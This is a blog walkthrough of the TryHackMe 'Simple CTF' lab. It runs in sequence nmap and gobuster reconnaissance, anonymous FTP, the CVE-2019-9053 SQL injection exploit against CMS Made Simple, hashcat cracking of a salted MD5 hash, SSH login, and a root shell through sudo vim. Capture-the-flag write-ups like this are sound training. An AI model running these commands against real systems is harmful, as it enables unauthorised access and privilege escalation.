---
layout: post
title:  "THM: Simple CTF!"
date:   2024-01-20 13:50:01 -0600
categories: TryHackMe
image: /assets/img/SimpleCTFcover.png
---
[Simple CTF](https://tryhackme.com/room/easyctf)
Beginner level ctf

Set variable for $IPADDR
```
IPADDR=10.10.212.173
echo $IPADDR
```


Run nmap scan against $IPADDR
```
$ nmap -p- -sV -sC -T4 -o nmap_scan $IPADDR
```

``` bash
Starting Nmap 7.60 ( https://nmap.org ) at 2024-01-19 02:30 GMT
Nmap scan report for ip-10-10-154-86.eu-west-1.compute.internal (10.10.154.86)
Host is up (0.00038s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Cant get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.253.140
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (EdDSA)
MAC Address: 02:39:DB:2C:CC:73 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 472.84 seconds
```

ftp to $IPADDR using anonymous

``` bash
root@ip-10-10-253-140:~# ftp $IPADDR
Connected to 10.10.154.86.
220 (vsFTPd 3.0.3)
Name (10.10.154.86:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.

```
look at public directory

```
ftp> cd pub
250 Directory successfully changed.

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
```

get file
```
ftp> get ForMitch.txt
local: ForMitch.txt remote: ForMitch.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
226 Transfer complete.
166 bytes received in 0.00 secs (3.1662 MB/s)
ftp> exit
221 Goodbye.
```

open file
```
cat ForMitch.txt

Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

run gobuster 

```
gobuster dir -u $IPADDR -w /usr/share/wordlists/dirb/common.txt -t 1

Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.154.86
[+] Threads:        1
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2024/01/19 02:42:04 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
/simple (Status: 301)
===============================================================
2024/01/19 02:42:06 Finished
===============================================================
```

Looks like we have /simple
Browse to Website $IPADDR/simple
![Image of SimpleCMS]({{site.baseurl}}/assets/img/SimpleCTFSimpleCMS.jpg)

On bottom, we have SimpleCMS

Use searchsploit for exploit

```
$ searchsploit cms made simple
------------------------------------------------- ---------------------------------
 Exploit Title                                   |  Path
------------------------------------------------- ---------------------------------
CMS Made Simple (CMSMS) Showtime2 - File Upload  | php/remote/46627.rb
CMS Made Simple 0.10 - 'index.php' Cross-Site Sc | php/webapps/26298.txt
CMS Made Simple 0.10 - 'Lang.php' Remote File In | php/webapps/26217.html
CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site | php/webapps/29272.txt
CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Inj | php/webapps/29941.txt
CMS Made Simple 1.11.10 - Multiple Cross-Site Sc | php/webapps/32668.txt
CMS Made Simple 1.11.9 - Multiple Vulnerabilitie | php/webapps/43889.txt
CMS Made Simple 1.2 - Remote Code Execution      | php/webapps/4442.txt
CMS Made Simple 1.2.2 Module TinyMCE - SQL Injec | php/webapps/4810.txt
CMS Made Simple 1.2.4 Module FileManager - Arbit | php/webapps/5600.php
CMS Made Simple 1.4.1 - Local File Inclusion     | php/webapps/7285.txt
CMS Made Simple 1.6.2 - Local File Disclosure    | php/webapps/9407.txt
CMS Made Simple 1.6.6 - Local File Inclusion / C | php/webapps/33643.txt
CMS Made Simple 1.6.6 - Multiple Vulnerabilities | php/webapps/11424.txt
CMS Made Simple 1.7 - Cross-Site Request Forgery | php/webapps/12009.html
CMS Made Simple 1.8 - 'default_cms_lang' Local F | php/webapps/34299.py
CMS Made Simple 1.x - Cross-Site Scripting / Cro | php/webapps/34068.html
CMS Made Simple 2.1.6 - 'cntnt01detailtemplate'  | php/webapps/48944.py
CMS Made Simple 2.1.6 - Multiple Vulnerabilities | php/webapps/41997.txt
CMS Made Simple 2.1.6 - Remote Code Execution    | php/webapps/44192.txt
CMS Made Simple 2.2.14 - Arbitrary File Upload ( | php/webapps/48779.py
CMS Made Simple 2.2.14 - Authenticated Arbitrary | php/webapps/48742.txt
CMS Made Simple 2.2.14 - Persistent Cross-Site S | php/webapps/48851.txt
CMS Made Simple 2.2.15 - RCE (Authenticated)     | php/webapps/49345.txt
CMS Made Simple 2.2.15 - Stored Cross-Site Scrip | php/webapps/49199.txt
CMS Made Simple 2.2.5 - (Authenticated) Remote C | php/webapps/44976.py
CMS Made Simple 2.2.7 - (Authenticated) Remote C | php/webapps/45793.py
CMS Made Simple < 1.12.1 / < 2.1.3 - Web Server  | php/webapps/39760.txt
CMS Made Simple < 2.2.10 - SQL Injection         | php/webapps/46635.py
CMS Made Simple Module Antz Toolkit 1.02 - Arbit | php/webapps/34300.py
CMS Made Simple Module Download Manager 1.4.1 -  | php/webapps/34298.py
CMS Made Simple Showtime2 Module 3.6.2 - (Authen | php/webapps/46546.py
------------------------------------------------- ---------------------------------
Shellcodes: No Results
The CMS Made Simple landing page at http://IPADDR/simple/ showed that the machine was running version 2.2.8. One particular entry that stood out applied to all versions less than 2.2.10 and involved SQL injection.

```
use the php/webapps/46635.py as its for 2.2.10

```
$ searchsploit -p 46635   

  Exploit: CMS Made Simple < 2.2.10 - SQL Injection
      URL: https://www.exploit-db.com/exploits/46635
     Path: /opt/exploitdb/exploits/php/webapps/46635.py
    Codes: CVE-2019-9053
 Verified: False
File Type: Python script, ASCII text executable
```

$ searchsploit -m 46635 
This gives a python module which should do most of the hard work for us.

```
  Exploit: CMS Made Simple < 2.2.10 - SQL Injection
      URL: https://www.exploit-db.com/exploits/46635
     Path: /opt/exploitdb/exploits/php/webapps/46635.py
    Codes: CVE-2019-9053
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /root/46635.py
```

Run exploit
``` python
$ python 46635.py -u http://$IPADDR/simple --crack -w /usr/share/wordlists/rockyou.txt 
  File "46635.py", line 25
    print "[+] Specify an url target"
                                    ^
SyntaxError: Missing parentheses in call to 'print'. Did you mean print("[+] Specify an url target")?
```

Python 2
``` python
$ python2 46635.py -u http://$IPADDR/simple --crack -w /usr/share/wordlists/rockyou.txt 
Traceback (most recent call last):
  File "46635.py", line 11, in <module>
    import requests
ImportError: No module named requests
```

Install request module

```
sudo apt-get install python-requests -y
```

rerun exploiit
``` python
python2 46635.py -u http://$IPADDR/simple --crack -w /usr/share/wordlists/rockyou.txt
Traceback (most recent call last):
  File "46635.py", line 12, in <module>
    from termcolor import colored
ImportError: No module named termcolor
```

Install termcolor module
```
sudo apt-get install python-termcolor -y
```

rerun exploiit
``` python
python2 46635.py -u http://$IPADDR/simple --crack -w /usr/share/wordlists/rockyou.txt


[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: [redacted]
```

>To use hashcat against the hashed password

```
hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt


hashcat (v6.1.1-66-g6a419d06) starting...

* Device #2: Outdated POCL OpenCL driver detected!

This OpenCL driver has been marked as likely to fail kernel compilation or to produce false negatives.
You can use --force to override this, but do not report related errors.

OpenCL API (OpenCL 1.2 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: AMD EPYC 7571, 3832/3896 MB (974 MB allocatable), 2MCU

OpenCL API (OpenCL 1.2 pocl 1.1 None+Asserts, LLVM 6.0.0, SPIR, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
===========================================================================================================================
* Device #2: pthread-AMD EPYC 7571, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 51

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Precompute-Init
* Early-Skip
* Not-Iterated
* Prepended-Salt
* Single-Hash
* Single-Salt
* Raw-Hash

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache building /usr/share/wordlists/rockyou.txt: 33553435 bytes (23.9Dictionary cache building /usr/share/wordlists/rockyou.txt: 67106875 bytes (47.9Dictionary cache building /usr/share/wordlists/rockyou.txt: 100660309 bytes (71.Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 2 secs

0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:REDACTED
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5($salt.$pass)
Hash.Target......: 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2
Time.Started.....: Fri Jan 19 03:48:17 2024 (0 secs)
Time.Estimated...: Fri Jan 19 03:48:17 2024 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1145.4 kH/s (1.34ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2048/14344384 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> lovers1

```

ssh to system

``` bash
ssh mitch@$IPADDR -p 2222


The authenticity of host '[10.10.212.173]:2222 ([10.10.212.173]:2222)' can't be established.
ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[10.10.212.173]:2222' (ECDSA) to the list of known hosts.
mitch@10.10.212.173's password: 

$ls
user.txt
$ cat user.txt	
[REDACTED]
$ ls /home
mitch  [REDACTED]
```

Escalation via Sudo Shell Escaping
```
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

    $ sudo vim -c ':!/bin/sh'
```

https://gtfobins.github.io/gtfobins/vim/

Shell
It can be used to break out from restricted environments by spawning an interactive system shell.

```
sudo vim
```

Once inside, spawn shell

```
:!bash
```

Now we are root
```
root@Machine:~# ls 
user.txt
root@Machine:~# ls /root
root.txt
root@Machine:~# cat /root/root.txt
[REDACTED]
```

TCM Security used dirsearch
https://github.com/maurosoria/dirsearch

Install with git: git clone https://github.com/maurosoria/dirsearch.git --depth 1 (RECOMMENDED)

```
python3 dirsearch.py -u $IPADDR -e php,html -x 400,401,403
```
Unfortunately, for the dirsearch.py gives error in AttackBox so NOT recommended.